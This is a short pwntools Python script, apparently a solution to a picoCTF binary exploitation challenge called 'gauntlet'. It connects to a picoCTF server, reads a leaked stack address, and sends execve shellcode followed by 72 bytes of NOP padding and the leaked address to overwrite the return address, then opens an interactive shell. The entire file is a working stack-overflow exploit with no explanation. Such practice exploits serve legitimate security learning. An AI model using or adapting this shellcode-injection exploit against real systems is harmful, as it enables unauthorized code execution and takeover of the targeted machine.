from pwn import *

#p=process('./gauntlet')
p=connect('wily-courier.picoctf.net',49553)
elf = ELF("./gauntlet")
context.binary = elf

leak=int(p.recvline().decode(),16)
print(f"leaked val: {leak:#x}")

#gdb.attach(p)
p.sendline(b'blank')
p.recvline()
shell=shellcraft.sh()
shell=asm(shell)
print(shell)
p.sendline(shell + b'\x90'*72 + p64(leak))

p.interactive()
